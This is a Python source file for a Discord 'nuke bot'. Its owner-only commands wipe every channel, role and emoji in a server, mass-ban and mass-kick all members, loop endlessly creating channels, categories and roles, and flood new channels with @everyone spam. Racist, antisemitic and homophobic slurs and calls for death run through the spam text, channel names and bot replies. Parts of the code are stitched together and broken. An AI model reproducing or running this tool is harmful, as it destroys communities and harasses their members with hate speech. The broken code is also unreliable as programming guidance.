import os
import discord
from discord.ext import commands
import random
from discord import Permissions
import colorama
from colorama import Fore
import os
from discord.utils import get

TOKEN = os.environ["TOKEN"]

SPAM_CHANNEL = ("NUKED BY HITLER")

SPAM_MESSAGE = ["@everyone Death To All Nigger Jews https://cdn.discordapp.com/attachments/1064930483353427978/1070885434898514010/VID_20230202_001209_823.mp4.mov  ","@everyone https://cdn.discordapp.com/attachments/1064930483353427978/1070885434898514010/VID_20230202_001209_823.mp4.mov","@everyone Death to All Nigger Jews https://cdn.discordapp.com/attachments/1064930483353427978/1070885434898514010/VID_20230202_001209_823.mp4.mov","@everyone https://cdn.discordapp.com/attachments/1064930483353427978/1070885434898514010/VID_20230202_001209_823.mp4.mov"]


os.system('cls & mode 85,20 & title [GYPSY CRUSADER NUKE BOT] ')
os.system('cls')
bot = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=False)
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')

...
from discord.ext import commands
...

# Change only the no_category default string
help_command = commands.DefaultHelpCommand(
    no_category = 'Nigger Nuking Commands'
)

# Create the bot and pass it the modified help_command
bot = commands.Bot(
    command_prefix = commands.when_mentioned_or('!'),
    help_command = help_command
)


@bot.command(pass_context = True)
async def chat(ctx, *args):
    channel = bot.get_channel(1072710756891623456)
    await channel.send('Rules')
    


import json
import asyncio
class Levels(commands.Cog):
    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author == self.bot.user:
            return

        author_id = str(message.author.id)
        bot = commands.Bot(command_prefix='!')

        if author_id not in self.users:
            self.users[author_id] = {}
            self.users[author_id]['level'] = 1
            self.users[author_id]['exp'] = 0

        self.users[author_id]['exp'] += 1

        if author_id in self.users:
            if self.lvl_up(author_id):
                channel = bot.get_channel('636399538650742795')
                await channel.message.send(f"{message.author.mention} is now level {self.users[author_id]['level']}! congrats!")

    def __init__(self, bot):
        self.bot = bot

        with open(r"cogs\userdata.json", 'r') as f:
            self.users = json.load(f)

            self.bot.loop.create_task(self.save_users())

    async def save_users(self):
        await self.bot.wait_until_ready()
        while not self.bot.is_closed():
            with open(r"cogs\userdata.json", 'w') as f:
                json.dump(self.users, f, indent=4)

            await asyncio.sleep(5)


    def lvl_up(self, author_id):
        author_id = str(author_id)
        current_xp = self.users[author_id]['exp']
        current_lvl = self.users[author_id]['level']
        if current_xp >= ((3 * (current_lvl ** 2)) / .5):
            self.users[author_id]['level'] += 1
            return True
        else:
            return False





@bot.event
async def on_ready():
  print(Fore.MAGENTA + ("Made By: Gypsy Crusader") + Fore.RESET)
  print(Fore.BLUE + ("~Ready~") + Fore.RESET)


@bot.command()
@commands.is_owner()
async def reset(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.BLUE + f"{channel.name} Was Deleted." + Fore.RESET)
      except:
        print(Fore.YELLOW + f"{channel.name} Was Not Deleted." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.BLUE + f"{role.name} Has Been Deleted" + Fore.RESET)
     except:
       print(Fore.YELLOW + f"{role.name} Has Not Been Deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.BLUE + f"{emoji.name} Was Deleted" + Fore.RESET)
     except:
       print(Fore.YELLOW + f"{emoji.name} Was Not Deleted" + Fore.RESET)

@bot.command(pass_context = True)
async def mute(ctx, member: discord.Member):
     if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '194151340090327041':
        role = discord.utils.get(member.server.roles, name='Muted')
        await bot.add_roles(member, role)
        embed=discord.Embed(title="The Nigtard Was Muted!", description="**{0}** was muted by **{1}**!".format(member, ctx.message.author), color=0xff00f6)
        await bot.say(embed=embed)
     else:
        embed=discord.Embed(title="Permission Denied.", description="You don't have permission to use this command:monkey:.", color=0xff00f6)
        await bot.say(embed=embed)

snipe_message_author = {}
snipe_message_content = {}

@bot.event
async def on_message_delete(message):
     snipe_message_author[message.channel.id] = message.author
     snipe_message_content[message.channel.id] = message.content
     await snipe(60)
     del snipe_message_author[message.channel.id]
     del snipe_message_content[message.channel.id]

@bot.command(name = 'snipe')
async def snipe(ctx):
    channel = ctx.channel
    try: #This piece of code is run if the bot finds anything in the dictionary
        em = discord.Embed(name = f"Last deleted message in #{channel.name}", description = snipe_message_content[channel.id])
        em.set_footer(text = f"This message was sent by the monkey {snipe_message_author[channel.id]}")
        await ctx.send(embed = em)
    except KeyError: #This piece of code is run if the bot doesn't find anything in the dictionary
        await ctx.send(f"There are no recently deleted messages in #{channel.name}")

    await ctx.message.delete()

#If the bot sends the embed, but it's empty, it simply means that the deleted message was either a media file or another embed.


@bot.command()
@commands.has_guild_permissions(manage_roles=True, administrator=True)
async def dr(ctx, role_name, *, exceptions=None):
    deleted_roles = 0
    if exceptions == None:
        guild = bot.get_guild(ctx.guild.id)
        for role in ctx.guild.roles:
            is_exception = False
            if role.name == role_name:
                await role.delete()
                deleted_roles += 1
        if deleted_roles == 0:
            await ctx.send("Couldn't find any roles with that name")
        else:
            await ctx.send(f'Found and deleted {deleted_roles} roles')
    else:
        try:
            exceptions_cont = exceptions.split(' --exc ')
            
            if len(exceptions_cont) > 1:
                role_name = role_name + ' ' + exceptions_cont[0]
                if not exceptions_cont[1] == '':
                    exceptions = exceptions_cont[1].split(', ')
            else:
                exceptions = exceptions.split(', ')
            
        except Exception as e:
            exceptions = exceptions.split(', ')
           
        guild = bot.get_guild(ctx.guild.id)
        for role in ctx.guild.roles:
            is_exception = False
            if role.name == '@everyone':
                continue
            if role.name == role_name:

                for exception in exceptions:
                    if int(role.id) == int(exception):
                        is_exception = True

                if is_exception:
                    pass
                else:
                    await role.delete()
                    deleted_roles += 1

        if deleted_roles == 0:
            await ctx.send("Couldn't find any roles with that name")
        else:
            await ctx.send(f'Found and deleted {deleted_roles} roles')



@bot.command()
@commands.has_permissions(manage_channels=True, administrator=True)
async def delete(ctx, channel_name, *, exceptions='None'):
    deleted_channels = 0
    if exceptions == 'None':
        guild = bot.get_guild(ctx.guild.id)
        for channel in ctx.guild.text_channels:
            is_exception = False
            if channel.name == channel_name:
                await channel.delete()
                deleted_channels += 1
        if deleted_channels == 0:
            await ctx.send("O can't find any fuckin channels with that name")
        else:
            try:
                await ctx.send(f'Found and deleted {deleted_channels} channels')
            except Exception:  # If the channel you typed the message is deleted some errors occure
                pass
    else:

        exceptions_cont = exceptions.split(', ')
        guild = bot.get_guild(ctx.guild.id)
        for channel in ctx.guild.text_channels:
            is_exception = False
            if channel.name == channel_name:

                for exception in exceptions_cont:
                    if int(channel.id) == int(exception):
                        is_exception = True

                if is_exception:
                    pass
                else:
                    await channel.delete()
                    deleted_channels += 1

        if deleted_channels == 0:
            await ctx.send("Couldn't find any channels with that name")
        else:
            try:
                await ctx.send(f'Found and deleted {deleted_channels} channels')
            except Exception:  # If the channel you typed the message is deleted some errors occure
                pass
        await ctx.message.delete()

@bot.command()
@commands.has_permissions(ban_members=True)
async def ball(ctx):
        for member in ctx.guild.members:

            if member == bot.user:
                continue

            try:
                await member.ban()
            except discord.Forbidden:
                print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
            else:
                print(f"{member.name} has been kicked from {ctx.guild.name}")

        print("Action Completed: ball")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx,*,member):
    banned_users = await ctx.guild.bans()
    member_name, member_disc = member.split('>>')

    for banned_entry in banned_users:
        user = banned_entry.user

        if(user.name, user.discriminator)==(member.name,member_disc):

            await ctx.uild.unban(user)
            await ctx.send(member.name +" the nigger has been unbanned!")
            return

    await ctx.send(member+"the nigger was not found!")


@bot.command(aliases=['c', 'purge', 'p'])
@commands.has_permissions(manage_messages = True)
async def clear(ctx,amount=3):
    await ctx.channel.purge(limit = amount)
        
    await ctx.message.delete()

@bot.command(aliases=['dm'])
async def DM(ctx, user : discord.User, *, msg):
    try:
        await user.send(msg)
        await ctx.send(f':white_check_mark: Your Message has been sent')
    except:
        await ctx.send(':x: Nigger had their dm close, message not sent')
        await ctx.message.delete()

@bot.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx,member : discord.Member,*,reason= "No Reason Provided"):
    await member.send("You have been kicked from **Niggers R us** fucking faggot")
    await member.kick(reason=reason)
    await ctx.message.delete()
  

@bot.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx,member : discord.Member,*,reason= "No Reason Provided"):
    await ctx.send(member.name + " is a nigger and has been from banned the server ")
    await member.ban(reason=reason)
    await ctx.message.delete()


@bot.command()
@commands.is_owner()
async def online(ctx):
    await bot.change_presence(status=discord.Status.online)
    print(Fore.GREEN + "Set The Bots Status To Online" + Fore.RESET)
    await ctx.message.delete()

@bot.command()
@commands.is_owner()
async def idle(ctx):
    await bot.change_presence(status=discord.Status.idle)
    print(Fore.GREEN + "Set The Bots Status To Idle" + Fore.RESET)
    await ctx.message.delete()

@bot.command()
@commands.is_owner()
async def dnd(ctx):
    await bot.change_presence(status=discord.Status.do_not_disturb)
    print(Fore.Blue + "Set The Bots Status To DND" + Fore.RESET)
    await ctx.message.delete()

@bot.command()
@commands.is_owner()
async def offline(ctx):
    await bot.change_presence(status=discord.Status.offline)
    print(Fore.Blue + "Set The Bots Status To Offline" + Fore.RESET)
    await ctx.message.delete()

@bot.command()
@commands.is_owner()
async def streaming(ctx):
   await bot.change_presence(status=discord.Status.Streaming)
   print(Fore.Blue + "Set The Bots Status To Streaming" + Fore.RESET)


@bot.command()
@commands.is_owner()
async def monkey(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_category(name="🐒🍌OooOooOo AH AH🍌🐒")

@bot.command()
@commands.is_owner()
async def spamca(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_category(name="DEATH TO ALL NIGGER JEWS")

@bot.command()
@commands.is_owner()
async def mch(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_text_channel(name="Bananas🐒")

@bot.command()
@commands.is_owner()
async def spamch(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_text_channel(name="DEATH TO ALL NIGGER JEWS")
   
@bot.command()
@commands.is_owner()
async def monkeyr(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_role(name="Bananas")

@bot.command()
@commands.is_owner()
async def spamr(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_role(name="Jew Faggot")

@bot.command()
@commands.is_owner()
async def admin(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await ctx.guild.create_role(name="Gypsy Crusader",colour=0xff0000)
  role = discord.utils.get(guild.roles, name = "ADMINISTRATION")
  await role.edit(permissions = Permissions.all())

@bot.command()
@commands.is_owner()
async def inv(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(Fore.MAGENTA + (f"New Invite: {link}") + Fore.RESET)
    amount = 500

@bot.command()
@commands.is_owner()
async def spamb(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(Fore.RED + (f"EXECUTED {user}") + Fore.RESET)
        except:
           pass
          
@bot.command()
@commands.is_owner()
async def spamk(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(Fore.BLUE + (f"KICKED {user}") + Fore.RESET)
        except:
           pass

@bot.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout() 
    print (Fore.BLUE + f"{bot.user.name} Has Logged Out" + Fore.RESET)

@bot.command()
@commands.is_owner()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.BLUE + f"{channel.name} Was Deleted" + Fore.RESET)
      except:
        print(Fore.YELLOW + f"{channel.name} Was not Deleted." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.BLUE + f"{role.name} Has Been Deleted" + Fore.RESET)
     except:
       print(Fore.YELLOW + f"{role.name} Has Not Been Deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.BLUE + f"{emoji.name} Was Deleted" + Fore.RESET)
     except:
       print(Fore.YELLOW + f"{emoji.name} Was Not Deleted" + Fore.RESET)
    await guild.edit(name="New York Zoo")
    await guild.create_text_channel(SPAM_CHANNEL)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(Fore.MAGENTA + (f"New Invite: {link}") + Fore.RESET)
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(SPAM_CHANNEL)
    return

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

bot.run(TOKEN, bot=True)
